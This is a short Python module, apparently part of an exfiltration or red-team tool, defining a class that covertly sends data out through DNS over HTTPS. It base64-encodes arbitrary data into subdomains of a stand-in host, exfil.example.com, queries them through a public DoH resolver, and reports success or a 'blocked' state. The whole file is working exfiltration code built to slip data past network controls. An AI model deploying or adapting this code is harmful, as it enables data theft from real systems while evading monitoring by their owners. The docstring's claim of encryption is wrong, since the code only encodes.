import requests
import base64

class DoHProtocol:
    """
    Exfiltrates data using DNS over HTTPS (DoH).
    """

    def __init__(self, command):
        self.name = "DoH"
        self.command = command
        self.doh_resolver = "https://cloudflare-dns.com/dns-query"

    def encode_data(self, data):
        """Encodes data as a base64 DNS query."""
        return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

    def send_doh_query(self, encoded_data):
        """Sends the exfiltrated data as a DoH request."""
        query = f"{encoded_data}.exfil.example.com"
        params = {"name": query, "type": "TXT"}
        
        headers = {"Accept": "application/dns-json"}
        
        try:
            response = requests.get(self.doh_resolver, params=params, headers=headers)
            if response.status_code == 200:
                return True
            else:
                print(f"❌ DoH Query Failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ DoH Request Error: {e}")
            return False

    def transmit(self, data):
        """Encrypt and send data via DoH."""
        encoded_data = self.encode_data(data)
        success = self.send_doh_query(encoded_data)

        if success:
            print("✅ DoH Exfiltration Completed")
        else:
            print("⚠️ DoH Exfiltration Blocked! Adjusting parameters...")

        return success
